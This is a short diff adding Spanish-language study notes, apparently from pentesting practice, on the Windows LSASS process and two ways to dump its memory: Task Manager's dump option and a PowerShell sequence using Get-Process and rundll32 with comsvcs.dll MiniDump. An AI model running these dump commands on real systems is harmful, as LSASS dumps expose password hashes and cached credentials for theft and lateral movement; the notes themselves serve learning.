@@ -1,1 +1,17 @@
+El lsass es un proceso crítico en el manejo de credenciales y autenticación de passwords en los sistemas windows
+Luego del log in inicial, lsass va a:
+-Guardar las credenciales en la cache
+-Crear access tokens
+-Cumplimentar las políticas de seguridad
+-Escribir el windows security log
 
+dumpearlo desde el taskmanager:
+
+taskmanager > processess > Local Security Authority Process > create dump file
+el archivo se va a crear en: C:\Users\loggedonusersdirectory\AppData\Local\Temp
+
+dumpearlo desde powershell:
+buscamos el ID del proceso
+Get-Process lsass
+luego creamos el archivo
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full
